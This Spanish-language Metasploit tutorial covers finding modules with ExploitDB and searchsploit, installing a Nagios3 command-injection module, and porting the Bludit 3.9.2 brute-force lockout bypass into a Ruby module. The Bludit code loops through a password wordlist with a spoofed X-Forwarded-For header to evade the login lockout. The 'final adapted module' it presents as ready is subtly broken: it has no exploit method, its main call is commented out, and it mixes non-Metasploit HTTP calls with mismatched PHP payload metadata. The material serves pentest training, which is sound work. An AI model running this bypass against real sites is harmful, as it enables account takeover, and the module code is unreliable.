# Escribir e Importar Módulos en Metasploit

## Actualización e Importación de Módulos

### Actualización Completa del Framework

La forma más directa de obtener módulos nuevos en Metasploit es actualizar todo el framework desde la terminal. Este método garantiza que todos los exploits, auxiliares y características más recientes se instalen en la versión más actual de `msfconsole`.

**Condición importante**: Los módulos porteados deben haber sido integrados (pushed) en la rama principal del repositorio [Metasploit Framework en GitHub](https://github.com/rapid7/metasploit-framework) para estar disponibles en las actualizaciones oficiales.

### Instalación Manual de Módulos Específicos

Si solo necesitamos un módulo específico y no queremos realizar una actualización completa del framework, podemos descargarlo e instalarlo manualmente. Este enfoque es útil cuando:

- Queremos evitar posibles conflictos de una actualización completa
- Necesitamos un módulo que aún no está en la rama principal oficial
- Trabajamos con restricciones de conectividad o ancho de banda

## Búsqueda de Módulos en ExploitDB

### ExploitDB como Fuente de Módulos

[ExploitDB](https://www.exploit-db.com) es una base de datos exhaustiva de exploits públicamente disponibles. Para nuestros propósitos, ofrece una ventaja clave: **sistema de etiquetas (tags)** que permite filtrar por formato.

### Filtrado por Tag "Metasploit Framework"

Accediendo a [https://www.exploit-db.com/?tag=3](https://www.exploit-db.com/?tag=3), podemos filtrar exclusivamente por scripts que ya están disponibles en formato de módulo de Metasploit. Estos pueden:

- Descargarse directamente desde ExploitDB
- Instalarse en el directorio local de Metasploit Framework
- Buscarse y ejecutarse desde dentro de `msfconsole`

### Ejemplo Práctico: Módulo Nagios3

Supongamos que queremos usar un exploit para Nagios3 que aprovecha una vulnerabilidad de inyección de comandos. El módulo específico es: **Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)**.

**Búsqueda en msfconsole:**

```
msf6 > search nagios

Matching Modules
================

   #  Name                                                          Disclosure Date  Rank       Check  Description
   -  ----                                                          ---------------  ----       -----  -----------
   0  exploit/linux/http/nagios_xi_authenticated_rce                2019-07-29       excellent  Yes    Nagios XI Authenticated Remote Command Execution
   1  exploit/linux/http/nagios_xi_chained_rce                      2016-03-06       excellent  Yes    Nagios XI Chained Remote Code Execution
   2  exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo  2018-04-17       manual     Yes    Nagios XI Chained Remote Code Execution
   3  exploit/linux/http/nagios_xi_magpie_debug                     2018-11-14       excellent  Yes    Nagios XI Magpie_debug.php Root Remote Code Execution
   4  exploit/linux/misc/nagios_nrpe_arguments                      2013-02-21       excellent  Yes    Nagios Remote Plugin Executor Arbitrary Command Execution
   5  exploit/unix/webapp/nagios3_history_cgi                       2012-12-09       great      Yes    Nagios3 history.cgi Host Command Execution
   6  exploit/unix/webapp/nagios_graph_explorer                     2012-11-30       excellent  Yes    Nagios XI Network Monitor Graph Explorer Component Command Injection
   7  post/linux/gather/enum_nagios_xi                              2018-04-17       normal     No     Nagios XI Enumeration
```

El módulo `statuswml.cgi` no aparece en los resultados, lo que indica:
- El framework no está actualizado con ese módulo específico, O
- El módulo no está en la versión oficial de Metasploit Framework

Sin embargo podemos encontrarlo en [exploit-db](https://www.exploit-db.com/exploits/9861)

## Uso de SearchSploit para Búsqueda Local

### SearchSploit: Versión CLI de ExploitDB

Como alternativa al navegador web, podemos usar **searchsploit**, la versión de línea de comandos de ExploitDB.

**Búsqueda básica:**

```bash
searchsploit nagios3
```

**Salida:**
```
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nagios3 - 'history.cgi' Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb
Nagios3 - 'history.cgi' Remote Command Execution                                                                                             | multiple/remote/24084.py
Nagios3 - 'statuswml.cgi' 'Ping' Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb
Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

### Identificación de Archivos Ruby para Metasploit

**Observación crítica**: Los archivos con terminación `.rb` son scripts de Ruby que, frecuentemente, han sido diseñados específicamente para uso dentro de `msfconsole`.

**Advertencia importante**: No todos los archivos `.rb` son automáticamente compatibles con `msfconsole`. Algunos exploits están escritos en Ruby sin contener código compatible con el formato de módulo de Metasploit.

### Filtrado Avanzado con SearchSploit

Para obtener solo resultados en formato Ruby:

```bash
searchsploit -t Nagios3 --exclude=".py"
```

**Explicación de parámetros:**
- `-t`: Búsqueda en título (title search)
- `--exclude=".py"`: Excluir archivos Python

**Salida filtrada:**
```
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nagios3 - 'history.cgi' Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb
Nagios3 - 'statuswml.cgi' 'Ping' Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb
Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

## Estructura de Directorios de Metasploit

### Ubicación Principal del Framework

El directorio predeterminado donde se almacenan todos los módulos, scripts, plugins y archivos propietarios de `msfconsole`:

```
/usr/share/metasploit-framework/
```

**Contenido del directorio:**

```bash
ls /usr/share/metasploit-framework/
```

**Salida:**
```
app     db             Gemfile.lock                  modules     msfdb            msfrpcd    msf-ws.ru  ruby             script-recon  vendor
config  documentation  lib                           msfconsole  msf-json-rpc.ru  msfupdate  plugins    script-exploit   scripts
data    Gemfile        metasploit-framework.gemspec  msfd        msfrpc           msfvenom   Rakefile   script-password  tools
```

### Ubicación de Usuario (Symlinked)

Los directorios críticos también están enlazados simbólicamente en la carpeta home del usuario en `~/.msf4/`:

```bash
ls ~/.msf4/
```

**Salida:**
```
history  local  logos  logs  loot  modules  plugins  store
```

**Diferencia clave**: La ubicación `~/.msf4/` puede no tener toda la estructura de carpetas que `/usr/share/metasploit-framework/` posee. Deberemos crear las carpetas necesarias manualmente para mantener la misma estructura.

## Instalación Manual de Módulos

### Convenciones de Nomenclatura

**CRÍTICO**: Existen convenciones de nomenclatura estrictas que, si no se respetan, generarán errores cuando `msfconsole` intente reconocer el nuevo módulo.

**Reglas de nomenclatura:**
- **snake_case**: Usar guiones bajos, no guiones
- **Caracteres alfanuméricos**: Solo letras y números
- **No guiones**: Reemplazar `-` con `_`

**Ejemplos correctos:**
```
nagios3_command_injection.rb
our_module_here.rb
bludit_auth_bruteforce_bypass.rb
```

**Ejemplos incorrectos:**
```
nagios3-command-injection.rb  # Usa guiones
ourModuleHere.rb              # Usa camelCase
our module here.rb            # Usa espacios
```

### Proceso de Instalación

**1. Copiar el módulo al directorio apropiado:**

```bash
cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
```

**Nota**: El path debe reflejar la categoría del exploit:
- `exploits/` para exploits
- `auxiliary/` para módulos auxiliares
- `post/` para módulos de post-explotación
- Subcategorías como `unix/webapp/`, `windows/smb/`, etc.

**2. Cargar módulos adicionales al iniciar msfconsole:**

```bash
msfconsole -m /usr/share/metasploit-framework/modules/
```

### Carga de Módulos en Runtime

**Opción 1: Comando loadpath**

```
msf6> loadpath /usr/share/metasploit-framework/modules/
```

Este comando carga todos los módulos en la ruta especificada.

**Opción 2: Comando reload_all**

```
msf6 > reload_all
```

Este comando recarga todos los módulos, incluyendo los recién instalados.

### Verificación de la Instalación

**Búsqueda del módulo:**

```
msf6 > search nagios3_command_injection
```

**Uso directo:**

```
msf6 > use exploit/unix/webapp/nagios3_command_injection
```

**Verificar opciones:**

```
msf6 exploit(unix/webapp/nagios3_command_injection) > show options

Module options (exploit/unix/webapp/nagios3_command_injection):

   Name     Current Setting                 Required  Description
   ----     ---------------                 --------  -----------
   PASS     guest                           yes       The password to authenticate with
   Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80                              yes       The target port (TCP)
   SSL      false                           no        Negotiate SSL/TLS for outgoing connections
   URI      /nagios3/cgi-bin/statuswml.cgi  yes       The full URI path to statuswml.cgi
   USER     guest                           yes       The username to authenticate with
   VHOST                                    no        HTTP server virtual host

Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

El módulo está listo para usarse contra objetivos.

## Portado de Scripts a Módulos de Metasploit

### Requisitos Previos

Para adaptar un script personalizado de Python, PHP o cualquier otro lenguaje a un módulo de Ruby para Metasploit:

**Conocimientos necesarios:**
- Programación en Ruby
- Familiaridad con la arquitectura de módulos de Metasploit
- Comprensión de la [documentación de Metasploit](https://docs.metasploit.com/)

**Regla de formato**: Los módulos Ruby para Metasploit **siempre se escriben usando hard tabs** (tabulaciones reales, no espacios).

### Estrategia de Portado: Reutilización de Código Boilerplate

**Enfoque recomendado**: No comenzar desde cero. En su lugar:

1. Seleccionar un módulo existente de la misma categoría
2. Usarlo como plantilla (boilerplate)
3. Adaptar el código a las necesidades del nuevo script

**Ventajas:**
- Estructura ya validada
- Mixins apropiados pre-incluidos
- Formato correcto garantizado
- Ahorro significativo de tiempo

### Caso Práctico: Portando Bludit 3.9.2 Authentication Bypass

**Módulo a portar**: [Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass](https://www.exploit-db.com/exploits/48746)

**Paso 1: Verificar módulos existentes**

```bash
ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit
```

**Salida:**
```
bludit_upload_images_exec.rb
```

Encontramos un módulo existente de Bludit que podemos usar como plantilla.

**Paso 2: Copiar el script descargado**

```bash
cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb
```

**Nota del nombre**: Seguimos snake_case y describimos claramente la funcionalidad del módulo.

### Estructura de un Módulo de Metasploit

#### Include Statements (Mixins)

Al inicio del archivo copiado, encontramos los `include` statements. Estos son los **mixins** mencionados en la sección de Plugins y Mixins.

**Ejemplo del módulo boilerplate:**

```ruby
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  include Msf::Exploit::FileDropper
  include Msf::Auxiliary::Report
```

<img width="1648" height="810" alt="image" src="https://github.com/user-attachments/assets/c8d45165-1dc7-40ab-8338-aaef78c0e150" />


#### Documentación de Mixins

Para encontrar los mixins, clases y métodos apropiados, consultamos la [Documentación de Metasploit](https://docs.metasploit.com/api/).

**Mixins comunes y sus funciones:**

| Mixin | Descripción |
|-------|-------------|
| `Msf::Exploit::Remote::HttpClient` | Proporciona métodos para actuar como cliente HTTP al explotar un servidor HTTP |
| `Msf::Exploit::PhpEXE` | Método para generar payloads PHP de primera etapa |
| `Msf::Exploit::FileDropper` | Transfiere archivos y maneja limpieza de archivos después de establecer sesión con el objetivo |
| `Msf::Auxiliary::Report` | Proporciona métodos para reportar datos a la base de datos de MSF |

**Análisis para nuestro módulo**: 

Revisando las funciones, determinamos que **NO necesitamos** el mixin `FileDropper` ya que nuestro exploit de bruteforce no transfiere archivos. Podemos eliminarlo del código final.

### Sección de Información del Módulo

Esta sección define metadata crítica que aparece al ejecutar `info` sobre el módulo:

```ruby
def initialize(info={})
  super(update_info(info,
    'Name'           => "Bludit Directory Traversal Image File Upload Vulnerability",
    'Description'    => %q{
      This module exploits a vulnerability in Bludit. A remote user could abuse the uuid
      parameter in the image upload feature in order to save a malicious payload anywhere
      onto the server, and then use a custom .htaccess file to bypass the file extension
      check to finally get remote code execution.
    },
    'License'        => MSF_LICENSE,
    'Author'         =>
      [
        'christasa', # Original discovery
        'sinn3r'     # Metasploit module
      ],
    'References'     =>
      [
        ['CVE', '2019-16113'],
        ['URL', 'https://github.com/bludit/bludit/issues/1081'],
        ['URL', 'https://github.com/bludit/bludit/commit/a9640ff6b5f2c0fa770ad7758daf24fec6fbf3f5#diff-6f5ea518e6fc98fb4c16830bbf9f5dac']
      ],
    'Platform'       => 'php',
    'Arch'           => ARCH_PHP,
    'Notes'          =>
      {
        'SideEffects' => [ IOC_IN_LOGS ],
        'Reliability' => [ REPEATABLE_SESSION ],
        'Stability'   => [ CRASH_SAFE ]
      },
    'Targets'        =>
      [
        [ 'Bludit v3.9.2', {} ]
      ],
    'Privileged'     => false,
    'DisclosureDate' => "2019-09-07",
    'DefaultTarget'  => 0))
```

**Campos importantes:**

- **Name**: Nombre descriptivo del módulo
- **Description**: Explicación detallada de la vulnerabilidad y cómo el módulo la explota
- **License**: Siempre `MSF_LICENSE` para módulos de Metasploit
- **Author**: Array con créditos apropiados (descubridor original y autor del módulo)
- **References**: CVEs, URLs, patches relacionados
- **Platform/Arch**: Plataforma objetivo del exploit
- **Notes**: Metadata sobre efectos secundarios, confiabilidad y estabilidad
- **Targets**: Versiones específicas vulnerables
- **DisclosureDate**: Fecha de divulgación pública de la vulnerabilidad

### Sección de Opciones (Register Options)

Define los parámetros que el usuario debe configurar:

```ruby
register_options(
  [
    OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
    OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
    OptString.new('BLUDITPASS', [true, 'The password for Bludit'])
  ])
end
```

**Tipos de opciones disponibles:**

- `OptString`: Cadena de texto
- `OptInt`: Número entero
- `OptBool`: Booleano
- `OptPath`: Ruta de archivo
- `OptAddress`: Dirección IP
- `OptPort`: Número de puerto

**Formato**: `OptType.new('NAME', [required?, 'description', default_value])`

### Adaptación para Nuestro Módulo

Para nuestro exploit de bypass de bruteforce, necesitamos **wordlist de contraseñas** en lugar de `BLUDITPASS`:

```ruby
OptPath.new('PASSWORDS', [ true, 'The list of passwords',
    File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])
```

**Detalles:**
- `OptPath`: Acepta rutas de archivo
- Valor por defecto: Wordlist en el directorio de datos de Metasploit
- `Msf::Config.data_directory`: Variable que apunta a `/usr/share/metasploit-framework/data/`

### Código del Exploit

El resto del código debe ajustarse según las clases, métodos y variables utilizadas en el framework de Metasploit.

**Módulo final adaptado:**

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  include Msf::Auxiliary::Report
  
  def initialize(info={})
    super(update_info(info,
      'Name'           => "Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass",
      'Description'    => %q{
        Versions prior to and including 3.9.2 of the Bludit CMS are vulnerable to a bypass of the anti-brute force mechanism that is in place to block users that have attempted to login incorrectly ten times or more. Within the bl-kernel/security.class.php file, a function named getUserIp attempts to determine the valid IP address of the end-user by trusting the X-Forwarded-For and Client-IP HTTP headers.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'rastating', # Original discovery
          '0ne-nine9'  # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2019-17240'],
          ['URL', 'https://rastating.github.io/bludit-brute-force-mitigation-bypass/'],
          ['PATCH', 'https://github.com/bludit/bludit/pull/1090']
        ],
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Notes'          =>
        {
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability'   => [ CRASH_SAFE ]
        },
      'Targets'        =>
        [
          [ 'Bludit v3.9.2', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "2019-10-05",
      'DefaultTarget'  => 0))
      
   register_options(
    [
      OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
      OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
      OptPath.new('PASSWORDS', [ true, 'The list of passwords',
          File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])
    ])
  end
  
  # -- Exploit code -- #
  # dirty workaround to remove this warning:
  #   Cookie#domain returns dot-less domain name now. Use Cookie#dot_domain if you need "." at the beginning.
  # see https://github.com/nahi/httpclient/issues/252
  class WebAgent
    class Cookie < HTTP::Cookie
      def domain
        self.original_domain
      end
    end
  end

  def get_csrf(client, login_url)
    res = client.get(login_url)
    csrf_token = /input.+?name="tokenCSRF".+?value="(.+?)"/.match(res.body).captures[0]
  end

  def auth_ok?(res)
    HTTP::Status.redirect?(res.code) &&
      %r{/admin/dashboard}.match?(res.headers['Location'])
  end

  def bruteforce_auth(client, host, username, wordlist)
    login_url = host + '/admin/login'
    File.foreach(wordlist).with_index do |password, i|
      password = password.chomp
      csrf_token = get_csrf(client, login_url)
      headers = {
        'X-Forwarded-For' => "#{i}-#{password[..4]}",
      }
      data = {
        'tokenCSRF' => csrf_token,
        'username' => username,
        'password' => password,
      }
      puts "[*] Trying password: #{password}"
      auth_res = client.post(login_url, data, headers)
      if auth_ok?(auth_res)
        puts "\n[+] Password found: #{password}"
        break
      end
    end
  end

  #begin
  #  args = Docopt.docopt(doc)
  #  pp args if args['--debug']
  #
  #  clnt = HTTPClient.new
  #  bruteforce_auth(clnt, args['--root-url'], args['--user'], args['--wordlist'])
  #rescue Docopt::Exit => e
  #  puts e.message
  #end
end
```

**Características del código de exploit:**

- **Función `get_csrf`**: Extrae token CSRF de la página de login
- **Función `auth_ok?`**: Verifica si la autenticación fue exitosa
- **Función `bruteforce_auth`**: Lógica principal del ataque de fuerza bruta
- **Header `X-Forwarded-For`**: Spoofea IP para bypass del mecanismo anti-bruteforce

### Organización de Módulos Personalizados

**Mejores prácticas:**

1. **Estructura de directorios clara**: Mantener módulos en categorías apropiadas
2. **Nomenclatura descriptiva**: Nombres que indiquen funcionalidad sin ambigüedad
3. **Documentación interna**: Comentarios explicando lógica compleja
4. **Créditos apropiados**: Siempre dar crédito a descubridores originales

**Beneficios:**
- Facilita búsqueda de módulos personalizados
- Permite colaboración con otros pentesters
- Mantiene ambiente organizado y profesional

## Recursos Adicionales para Aprendizaje

### Documentación Oficial

Toda la información necesaria sobre programación Ruby para Metasploit Framework se encuentra en la [documentación oficial de Metasploit](https://docs.metasploit.com/).

**Contenido disponible:**
- Scanners y herramientas auxiliares
- Exploits personalizados
- Porting de exploits existentes
- API completa del framework

### Libros y Blog Posts Recomendados

**Libro:**
- [Metasploit: A Penetration Tester's Guide](https://nostarch.com/metasploit) - No Starch Press

**Blog posts de Rapid7:**
- [Writing Metasploit Modules](https://www.rapid7.com/blog/post/2012/07/05/part-1-metasploit-module-development-the-series/)

Estos recursos proporcionan tutoriales detallados y ejemplos prácticos para desarrollo de módulos.

## Mejores Prácticas al Escribir Módulos

1. **Siempre usar hard tabs**: No espacios, tabulaciones reales
2. **Seguir convenciones de nomenclatura**: snake_case, sin guiones
3. **Incluir metadata completa**: Autor, referencias, CVE, fechas
4. **Documentar el código**: Comentarios que expliquen lógica no obvia
5. **Reutilizar código existente**: Usar boilerplate de módulos similares
6. **Probar exhaustivamente**: Validar en múltiples escenarios antes de compartir
7. **Manejar errores apropiadamente**: Capturar excepciones y proporcionar mensajes útiles
8. **Limpiar recursos**: Eliminar archivos temporales, cerrar conexiones

## Referencias

- [Metasploit Framework en GitHub](https://github.com/rapid7/metasploit-framework)
- [Exploit Database](https://www.exploit-db.com)
- [ExploitDB - Tag Metasploit Framework](https://www.exploit-db.com/?tag=3)
- [Metasploit Documentation](https://docs.metasploit.com/)
- [Bludit Brute Force Mitigation Bypass](https://rastating.github.io/bludit-brute-force-mitigation-bypass/)
- [Writing Metasploit Modules - Rapid7 Blog](https://www.rapid7.com/blog/post/2012/07/05/part-1-metasploit-module-development-the-series/)
- [Metasploit: A Penetration Tester's Guide - No Starch Press](https://nostarch.com/metasploit)

---

La habilidad de escribir y adaptar módulos para Metasploit Framework es extremadamente valiosa durante evaluaciones de seguridad. Permite personalizar herramientas para necesidades específicas, portar exploits públicos al framework, y contribuir a la comunidad de seguridad ofensiva.
